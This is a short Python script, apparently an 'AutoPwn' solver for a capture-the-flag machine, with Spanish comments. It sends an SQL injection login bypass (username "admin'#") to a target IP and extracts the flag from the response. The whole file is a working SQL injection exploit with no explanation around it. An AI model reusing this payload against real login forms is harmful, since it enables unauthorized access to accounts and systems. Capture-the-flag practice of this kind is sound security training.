#!/usr/bin/python3

import argparse
import requests
import re
from colorama import Fore, Style

class Exploit:
    def __init__(self, ip_address):
        self.ip_address = ip_address

    def run(self, ip_address):

        url = "http://" + self.ip_address
        
        data = {
            "username": "admin'#",
            "password": "admin"
        }

        response = requests.post(url, data=data)
        flag = re.search(r"<h4>Your flag is: ([^<]*)", response.text).group(1)
        flag = flag.strip()  # Eliminar espacios en blanco alrededor de la bandera

        print
        print(Fore.GREEN + f"\nEl contenido de la 'flag': {flag}\n" + Style.RESET_ALL)

def get_arguments():
    parser = argparse.ArgumentParser(description='Uso de AutoPwn')
    parser.add_argument('-i', '--ip',default=80, dest='ip_address', required=False, help='IP de host remoto')
    return parser.parse_args()

def main():
    args = get_arguments()

    exploit = Exploit(args.ip_address)
    exploit.run(args.ip_address)

if __name__ == '__main__':
    main()





















